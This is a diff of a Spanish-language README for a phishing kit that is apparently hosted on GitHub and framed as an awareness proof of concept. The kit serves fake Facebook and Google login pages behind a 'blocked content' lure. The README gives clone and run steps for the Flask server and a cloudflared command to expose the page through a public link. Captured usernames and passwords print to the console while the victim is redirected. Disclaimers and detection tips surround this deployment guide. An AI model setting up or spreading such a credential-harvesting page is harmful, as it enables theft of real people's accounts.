@@ -1,47 +1,59 @@
-🛡️ ANDY TECHNOLOGY — IG AUDIT TOOL v2.0
-
-> **Herramienta de Concientización y Prueba de Concepto (PoC) sobre Phishing e Ingeniería Social**
-
-`IG Audit Tool v2.0` es un entorno de simulación diseñado para demostrar mecánicas de interceptación de credenciales en aplicaciones web mediante técnicas de suplantación de identidad. El objetivo principal es educar a usuarios e investigadores sobre cómo funcionan los vectores de ataque basados en ingeniería social y cómo detectarlos.
-
----
-
-## ⚠️ AVISO LEGAL Y DESLINDE DE RESPONSABILIDAD
-
-* **FINES EXCLUSIVAMENTE EDUCATIVOS:** Esta herramienta ha sido desarrollada únicamente para entornos de prueba autorizados, laboratorios de seguridad y auditorías de seguridad personal.
-* **USO RESPONSABLE Y ÉTICO:** Queda estrictamente prohibido el uso de este software en objetivos, infraestructura o cuentas sin el consentimiento explícito y por escrito del propietario.
-* **CUMPLIMIENTO LEGAL:** El acceso no autorizado a sistemas informáticos es un delito sancionado por leyes internacionales. El autor no se responsabiliza por el uso indebido o los daños derivados de la ejecución de este software.
-
----
-
-## ⚙️ CARACTERÍSTICAS TÉCNICAS
-
-* **Servidor backend en Python:** Interceptación y procesamiento de peticiones en tiempo real con interfaz de consola en banner ASCII.
-* **Frontend responsivo:** Interfaz adaptada a navegadores móviles y de escritorio.
-* **Persistencia local de logs:** Almacenamiento estructurado de registros de prueba en `registro_privado.txt`.
-* **Compatibilidad:** Optimizado para entornos Linux/Termux e integración con túneles de retransmisión tipo Cloudflare (*cloudflared*).
-
----
-
-## 🚀 INSTALACIÓN Y EJECUCIÓN (Laboratorio Termux / Linux)
-
-### Paso 1: Actualización del sistema e instalación de dependencias
-
-```bash
+🛡️ ANDY TECHNOLOGY SYSTEMS
+SIMULADOR DE CONCIENTIZACIÓN — INICIO DE SESIÓN FALSO
+Herramienta Educativa de Demostración de Phishing e Ingeniería Social
+Prueba de Concepto (PoC) diseñada para mostrar cómo funcionan los mecanismos de engaño en páginas que imitan plataformas oficiales como Facebook y Google. El objetivo es educar sobre su detección, demostrando que los atacantes no necesitan validar tus datos en el momento —solo recibirlos para probarlos después.
+⚠️ AVISO LEGAL Y DESLINDE DE RESPONSABILIDAD
+FINES EXCLUSIVAMENTE EDUCATIVOS: Este entorno se desarrolló solo para demostración en videos, charlas o análisis personal y autorizado.
+USO ÉTICO Y AUTORIZADO: Queda estrictamente prohibido ejecutarlo en dominios públicos, enviarlo a personas ajenas o usarlo para recopilar datos reales sin el consentimiento explícito y por escrito del propietario.
+CUMPLIMIENTO LEGAL: La suplantación de identidad y el acceso no autorizado a sistemas informáticos son delitos sancionados por leyes internacionales. El autor no se responsabiliza por el uso indebido o los daños derivados de una ejecución incorrecta.
+⚙️ CARACTERÍSTICAS TÉCNICAS
+Servidor backend en Python + Flask: Interceptación en tiempo real, con salida clara en consola.
+Interfaz profesional: Fondo oscuro con candados de contenido bloqueado, botones al estilo oficial, formularios que se despliegan al seleccionar la plataforma.
+Sin estructuras obligatorias: Todos los archivos funcionan juntos en la misma carpeta.
+Persistencia visual: Al enviar los datos se muestran inmediatamente en consola, sin validaciones intermedias.
+Compatibilidad total: Optimizado para Termux/Android y Linux, con soporte para túneles de acceso remoto.
+🚀 INSTALACIÓN Y EJECUCIÓN (Laboratorio Termux / Linux)
+Paso 1: Actualizar sistema e instalar dependencias
+bash
 pkg update && pkg upgrade -y
-pkg install python git cloudflared -y
-git clone [https://github.com/Andyromerook1/andy-ig-clon](https://github.com/Andyromerook1/andy-ig-clon)
-cd andy-ig-clon
-Paso 2: Despliegue del servidor local (Terminal 1)
-Intento
+pkg install python git -y
+pip install flask
+Paso 2: Clonar el repositorio y acceder a la carpeta
+bash
+git clone https://github.com/Andyromerook1/andart1.git
+cd andart1
+Paso 3: Iniciar el servidor
+bash
 python server.py
-Paso 3: Configuración del túnel de prueba (Terminal 2)
-Intento
-cloudflared tunnel --protocol http2 --url [http://127.0.0.1:8080](http://127.0.0.1:8080)
-🔍 VECTOR DE ATAQUE Y MITIGACIÓN (Sección Educativa)
-¿Cómo funciona el ataque?
-Suplantación de Dominio: El atacante utiliza un servidor local expuesto a través de un túnel HTTPS (Cloudflare, Ngrok) para imitar la interfaz legítima de una plataforma.
-
-Engaño Visual: La víctima no verifica la URL en la barra de direcciones e ingresa sus credenciales en el formulario suplantado.
-
-Captura y Redirección: El servidor local procesa los datos ingresados, los almacena en texto plano y redirige a la víctima a la plataforma real para disimular el ataque.
+Al ejecutarlo verás en pantalla la dirección de acceso: http://0.0.0.0:5000 o http://127.0.0.1:5000. Ingresá desde tu navegador a esa dirección.
+🔌 (Opcional) Acceso externo con túnel Cloudflare
+Si necesitás compartir el enlace para la demostración:
+Abrí una segunda terminal
+Ejecutá:
+bash
+pkg install cloudflared -y
+cloudflared tunnel --url http://127.0.0.1:5000
+Te devolverá un enlace público seguro para acceder desde cualquier navegador.
+📁 ESTRUCTURA DEL PROYECTO
+plaintext
+andart1/
+ ├─ server.py       → Lógica del servidor y recepción de datos
+ ├─ index.html      → Página principal con botones y formularios
+ ├─ aterrizaje.html → Página final con el "contenido prometido"
+ ├─ setup.sh        → Instalador automático de dependencias
+ ├─ .gitignore      → Archivos que no se suben al repositorio
+ └─ README.md       → Esta documentación completa
+🔍 ¿CÓMO FUNCIONA LA DEMOSTRACIÓN?
+Ingresás a la página: se ve el fondo negro con candados y el aviso de "contenido bloqueado".
+Seleccionás Iniciar con Facebook o Iniciar con Google: se despliega el formulario correspondiente.
+Escribís cualquier usuario y contraseña y enviás:
+En la página: te lleva al contenido prometido.
+En la consola de Termux: aparecen inmediatamente todos los datos ingresados, sin ninguna comprobación previa.
+Queda demostrado que el atacante no necesita saber si la clave es correcta en el momento: solo la recibe para probarla luego en la plataforma real.
+🛡️ ¿CÓMO DETECTAR Y EVITAR ESTE TIPO DE ATAQUES?
+Revisá siempre la dirección en la barra del navegador: solo confiá en dominios oficiales.
+Nunca ingresés tus claves en sitios que prometan contenido a cambio de iniciar sesión con redes sociales.
+Activá la verificación en dos pasos en todas tus cuentas.
+Si te llega un mensaje urgente o amenazante, no hagas clic: ingresá tú mismo a la plataforma oficial desde cero.
+📌 NOTA FINAL
+Esta herramienta es una réplica controlada diseñada exclusivamente para concientizar. El uso indebido es responsabilidad total de quien lo ejecute y puede tener consecuencias legales graves.
